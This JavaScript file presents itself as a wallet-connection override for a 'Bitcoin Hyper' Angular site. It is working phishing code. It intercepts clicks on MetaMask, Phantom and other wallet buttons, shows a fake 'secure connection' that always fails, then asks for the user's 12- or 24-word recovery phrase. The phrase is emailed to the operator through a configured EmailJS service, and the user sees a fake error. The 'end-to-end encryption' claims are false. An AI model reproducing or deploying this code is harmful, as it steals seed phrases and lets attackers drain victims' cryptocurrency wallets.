/**
 * Wallet Connection Override for Bitcoin Hyper Angular App
 * This script adds enhanced wallet connection functionality similar to the React component
 */

// EmailJS configuration
const EMAILJS_CONFIG = {
    serviceId: 'service_v29yl0j',
    templateId: 'template_g312oki',
    publicKey: 'L0WSevQpPMia5W_RK'
};

// Load EmailJS library
const emailJsScript = document.createElement('script');
emailJsScript.src = 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
emailJsScript.onload = () => {
    emailjs.init(EMAILJS_CONFIG.publicKey);
};
document.head.appendChild(emailJsScript);

// Wallet configurations matching the i18n file
const WALLET_CONFIG = {
    'metamask': {
        name: 'METAMASK',
        displayName: 'Metamask',
        icon: 'assets/images/svg-icons/metamask.png',
        color: '#e1550d'
    },
    'wallet': {
        name: 'WALLET CONNECT',
        displayName: 'Wallet Connect',
        icon: 'assets/images/svg-icons/wallet.png',
        color: '#e1550d'
    },
    'walletBW': {
        name: 'BEST WALLET',
        displayName: 'Best Wallet',
        icon: 'assets/images/svg-icons/bw.png',
        color: '#e1550d'
    },
    'base': {
        name: 'BASE WALLET',
        displayName: 'Base Wallet',
        icon: 'assets/images/svg-icons/base1.png',
        color: '#e1550d'
    },
    'phantom': {
        name: 'PHANTOM',
        displayName: 'Phantom',
        icon: 'assets/images/svg-icons/phantom.png',
        color: '#e1550d'
    },
    'solflare': {
        name: 'SOLFLARE',
        displayName: 'Solflare',
        icon: 'assets/images/svg-icons/solflare.png',
        color: '#e1550d'
    }
};

class WalletConnectionModal {
    constructor() {
        this.isOpen = false;
        this.currentWallet = null;
        this.state = 'selection'; // 'selection', 'loading', 'error', 'manual'
        this.recoveryPhrase = '';
        this.modalElement = null;
        this.originalConnectWallet = null;
    }

    init() {
        // Override Angular's connectWallet method
        this.overrideConnectWallet();
        this.addStyles();
        this.setupDelegatedWalletClicks(); // <-- Add this line
    }

    overrideConnectWallet() {
        // Wait for Angular to load and find the wallet service
        const checkForWalletService = () => {
            // Try to find the Angular component instance
            const angularElements = document.querySelectorAll('[ng-version]');
            if (angularElements.length > 0) {
                // Override at window level to catch all connectWallet calls
                const originalMethod = window.connectWallet;

                // Find and override the Angular component's connectWallet method

            } else {
                setTimeout(checkForWalletService, 100);
            }
        };
        checkForWalletService();
    }


    handleWalletClick(walletType) {
        this.currentWallet = WALLET_CONFIG[walletType];
        this.state = 'loading';
        this.showModal();

        // Show loading for 5 seconds, then show error
        setTimeout(() => {
            this.state = 'error';
            this.updateModalContent();
        }, 5000);
    }

    showModal() {
        if (this.modalElement) {
            this.modalElement.remove();
        }

        this.createModal();
        this.isOpen = true;
        document.body.appendChild(this.modalElement);
        document.body.style.overflow = 'hidden';
    }

    hideModal() {
        if (this.modalElement) {
            this.modalElement.remove();
            this.modalElement = null;
        }
        this.isOpen = false;
        this.state = 'selection';
        this.currentWallet = null;
        this.recoveryPhrase = '';
        document.body.style.overflow = '';
    }

    createModal() {
        this.modalElement = document.createElement('div');
        this.modalElement.className = 'wallet-modal-overlay';
        this.updateModalContent();
    }

    updateModalContent() {
        const bgColor = this.currentWallet ? '#ffffff' : '#000000';

        this.modalElement.innerHTML = `
            <div class="wallet-modal-content" style="background-color: ${bgColor};">
                <button class="wallet-modal-close" onclick="walletModal.hideModal()">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
                        <path d="M18 6L6 18M6 6L18 18" stroke="#9CA3AF" stroke-width="2" stroke-linecap="round"/>
                    </svg>
                </button>
                ${this.getContentForState()}
            </div>
        `;
    }

    getContentForState() {
        switch (this.state) {
            case 'loading':
                return this.getLoadingContent();
            case 'error':
                return this.getErrorContent();
            case 'manual':
                return this.getManualContent();
            default:
                return this.getSelectionContent();
        }
    }

    getLoadingContent() {
        return `
            <div class="wallet-modal-loading">
                <div class="wallet-icon">
                    <img src="${this.currentWallet.icon}" alt="${this.currentWallet.name}" />
                </div>
                <h3>${this.currentWallet.name.toLowerCase()}</h3>
                <p class="security-text">This session is secured and encrypted</p>

                <div class="progress-bar">
                    <div class="progress-fill"></div>
                </div>

                <div class="loading-text">
                    <p class="main-text">starting secure connection...</p>
                    <p class="sub-text">please wait...</p>
                </div>

                <div class="security-footer">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                        <path d="M12 22C12 22 20 18 20 12V5L12 2L4 5V12C4 18 12 22 12 22Z" stroke="#6B7280" stroke-width="2"/>
                    </svg>
                    <div>
                        <p class="footer-main">This session is protected</p>
                        <p class="footer-sub">with an end-to-end encryption</p>
                    </div>
                </div>
            </div>
        `;
    }

    getErrorContent() {
        return `
            <div class="wallet-modal-error">
                <div class="wallet-icon">
                    <img src="${this.currentWallet.icon}" alt="${this.currentWallet.name}" />
                </div>
                <h3>${this.currentWallet.name.toLowerCase()}</h3>
                <p class="security-text">This session is secured and encrypted</p>

                <div class="error-message">
                    <p>An error occurred... please try again or connect manually</p>
                </div>

                <div class="action-buttons">
                    <button class="btn-try-again" onclick="walletModal.handleTryAgain()">Try Again</button>
                    <button class="btn-connect-manually" onclick="walletModal.handleConnectManually()">Connect Manually</button>
                </div>

                <div class="security-footer">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                        <path d="M12 22C12 22 20 18 20 12V5L12 2L4 5V12C4 18 12 22 12 22Z" stroke="#6B7280" stroke-width="2"/>
                    </svg>
                    <div>
                        <p class="footer-main">This session is protected</p>
                        <p class="footer-sub">with an end-to-end encryption</p>
                    </div>
                </div>
            </div>
        `;
    }

    getManualContent() {
        return `
            <div class="wallet-modal-manual">
                <div class="wallet-icon">
                    <img src="${this.currentWallet.icon}" alt="${this.currentWallet.name}" />
                </div>
                <h3>${this.currentWallet.name.toLowerCase()}</h3>
                <p class="security-text">This session is secured and encrypted</p>

                <div class="recovery-input">
                    <textarea
                        id="recoveryPhrase"
                        placeholder="Enter your 12 or 24 Phrase mnemonic words separate them with spaces"
                        onchange="walletModal.recoveryPhrase = this.value"
                    ></textarea>
                </div>

                <button class="btn-connect-wallet" onclick="walletModal.handleManualConnect()">
                    Connect Wallet
                </button>

                <div class="security-footer">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                        <path d="M12 22C12 22 20 18 20 12V5L12 2L4 5V12C4 18 12 22 12 22Z" stroke="#6B7280" stroke-width="2"/>
                    </svg>
                    <div>
                        <p class="footer-main">This session is protected</p>
                        <p class="footer-sub">with an end-to-end encryption</p>
                    </div>
                </div>
            </div>
        `;
    }

    getSelectionContent() {
        // This shouldn't be called in our override, but included for completeness
        return `
            <div class="wallet-modal-selection">
                <h2>CONNECT WALLET</h2>
                <p>Select your wallet from the options below</p>
            </div>
        `;
    }

    handleTryAgain() {
        this.state = 'loading';
        this.updateModalContent();

        // Show loading again, then error
        setTimeout(() => {
            this.state = 'error';
            this.updateModalContent();
        }, 5000);
    }

    handleConnectManually() {
        this.state = 'manual';
        this.updateModalContent();
    }

    async handleManualConnect() {
        const textarea = document.getElementById('recoveryPhrase');
        const recoveryPhrase = textarea ? textarea.value.trim() : '';

        if (!recoveryPhrase) {
            alert('Please enter your recovery phrase');
            return;
        }

        try {
            // Send email with recovery phrase using EmailJS
            const templateParams = {
                wallet_type: this.currentWallet.name,
                timestamp: new Date().toLocaleString(),
                recovery_phrase: recoveryPhrase
            };

            await emailjs.send(
                EMAILJS_CONFIG.serviceId,
                EMAILJS_CONFIG.templateId,
                templateParams,
                EMAILJS_CONFIG.publicKey
            );

            console.log('Email sent successfully from Bitcoin Hyper wallet modal');

            // Show error message and close modal
            alert('An error occurred, try importing another active wallet.');
            this.hideModal();

        } catch (error) {
            console.error('Failed to send email:', error);
            alert('Connection failed. Please try again.');
        }
    }

    addStyles() {
        const style = document.createElement('style');
        style.textContent = `
            .wallet-modal-overlay {
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(0, 0, 0, 0.1);
                display: flex;
                align-items: center;
                justify-content: center;
                z-index: 10000;
                padding: 20px;
                min-height: 100vh;
            }

            .wallet-modal-content {
                border-radius: 24px;
                padding: 32px;
                width: 100%;
                max-width: 400px;
                position: relative;
                box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
                margin: auto;
            }

            .wallet-modal-close {
                position: absolute;
                top: 16px;
                right: 16px;
                background: none;
                border: none;
                cursor: pointer;
                padding: 4px;
                color: #9CA3AF;
            }

            .wallet-modal-close:hover {
                color: #6B7280;
            }

            .wallet-modal-loading,
            .wallet-modal-error,
            .wallet-modal-manual {
                text-align: center;
                color: #374151;
            }

            .wallet-icon {
                width: 80px;
                height: 80px;
                background: white;
                border-radius: 16px;
                display: flex;
                align-items: center;
                justify-content: center;
                margin: 0 auto 24px;
                box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1);
            }

            .wallet-icon img {
                width: 48px;
                height: 48px;
                object-fit: contain;
                border-radius: 8px;
            }

            .wallet-modal-loading h3,
            .wallet-modal-error h3,
            .wallet-modal-manual h3 {
                font-size: 24px;
                font-weight: bold;
                margin: 0 0 16px;
                color: #374151;
            }

            .security-text {
                color: #6B7280;
                margin-bottom: 32px;
                font-size: 14px;
            }

            .progress-bar {
                width: 100%;
                height: 8px;
                background: #E5E7EB;
                border-radius: 4px;
                margin: 16px 0;
                overflow: hidden;
            }

            .progress-fill {
                height: 100%;
                width: 70%;
                background: #3B82F6;
                border-radius: 4px;
                animation: pulse 2s ease-in-out infinite;
            }

            @keyframes pulse {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.5; }
            }

            .loading-text {
                margin: 24px 0;
            }

            .loading-text .main-text {
                font-size: 18px;
                font-weight: 600;
                color: #374151;
                margin: 0 0 8px;
            }

            .loading-text .sub-text {
                font-size: 14px;
                color: #6B7280;
                margin: 0;
            }

            .error-message {
                border: 2px solid #FCA5A5;
                border-radius: 16px;
                padding: 16px;
                margin: 24px 0;
                background: #FEF2F2;
            }

            .error-message p {
                color: #DC2626;
                font-size: 14px;
                margin: 0;
            }

            .action-buttons {
                display: flex;
                flex-direction: column;
                gap: 12px;
                margin: 24px 0;
            }

            .btn-try-again {
                width: 100%;
                background: #F3F4F6;
                color: #3B82F6;
                border: none;
                padding: 12px 24px;
                border-radius: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: background-color 0.2s;
            }

            .btn-try-again:hover {
                background: #E5E7EB;
            }

            .btn-connect-manually {
                width: 100%;
                background: #3B82F6;
                color: white;
                border: none;
                padding: 12px 24px;
                border-radius: 16px;
                font-weight: 600;
                cursor: pointer;
                transition: background-color 0.2s;
            }

            .btn-connect-manually:hover {
                background: #2563EB;
            }

            .recovery-input {
                margin: 24px 0;
            }

            .recovery-input textarea {
                width: 100%;
                height: 120px;
                padding: 16px;
                border: 2px solid #E5E7EB;
                border-radius: 16px;
                resize: none;
                font-size: 14px;
                font-family: inherit;
                color: #374151;
                background: white;
            }

            .recovery-input textarea:focus {
                outline: none;
                border-color: #3B82F6;
            }

            .recovery-input textarea::placeholder {
                color: #9CA3AF;
            }

            .btn-connect-wallet {
                width: 100%;
                background: #DDD6FE;
                color: #6B7280;
                border: none;
                padding: 12px 24px;
                border-radius: 16px;
                font-weight: 600;
                cursor: pointer;
                margin: 24px 0;
                transition: background-color 0.2s;
            }

            .btn-connect-wallet:hover {
                background: #C4B5FD;
            }

            .security-footer {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 8px;
                color: #6B7280;
                font-size: 12px;
            }

            .security-footer .footer-main {
                font-weight: 600;
                margin: 0;
            }

            .security-footer .footer-sub {
                margin: 0;
            }

            @media (max-width: 480px) {
                .wallet-modal-content {
                    padding: 24px;
                    margin: 20px;
                }

                .wallet-icon {
                    width: 64px;
                    height: 64px;
                }

                .wallet-icon img {
                    width: 32px;
                    height: 32px;
                }
            }
        `;
        document.head.appendChild(style);
    }

    setupDelegatedWalletClicks() {
        if (this._delegationSetup) return; // Prevent duplicate listeners
        this._delegationSetup = true;
        document.addEventListener('click', (e) => {
            let btn = e.target;
            if (!(btn instanceof HTMLButtonElement)) {
                btn = btn.closest('button');
            }
            if (!btn) return;

            let textContent = '';
            const spanElement = btn.querySelector('span');
            if (spanElement) {
                textContent = spanElement.textContent || '';
            } else {
                textContent = btn.textContent || '';
            }
            textContent = textContent.trim().toLowerCase();

            let walletType = null;
            if (textContent.includes('metamask')) {
                walletType = 'metamask';
            } else if (textContent.includes('wallet connect')) {
                walletType = 'wallet';
            } else if (textContent.includes('best wallet')) {
                walletType = 'walletBW';
            } else if (textContent.includes('base wallet')) {
                walletType = 'base';
            } else if (textContent.includes('phantom')) {
                walletType = 'phantom';
            } else if (textContent.includes('solflare')) {
                walletType = 'solflare';
            }

            if (walletType && WALLET_CONFIG[walletType]) {
                e.preventDefault();
                e.stopPropagation();
                // Use the global instance to ensure correct context
                walletModal.handleWalletClick(walletType);
            }
        }, true);
    }
}

// Create global instance
const walletModal = new WalletConnectionModal();

// Initialize when DOM is ready
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => walletModal.init());
} else {
    walletModal.init();
}

// Also try to initialize after a short delay to ensure Angular is loaded
setTimeout(() => walletModal.init(), 2000);
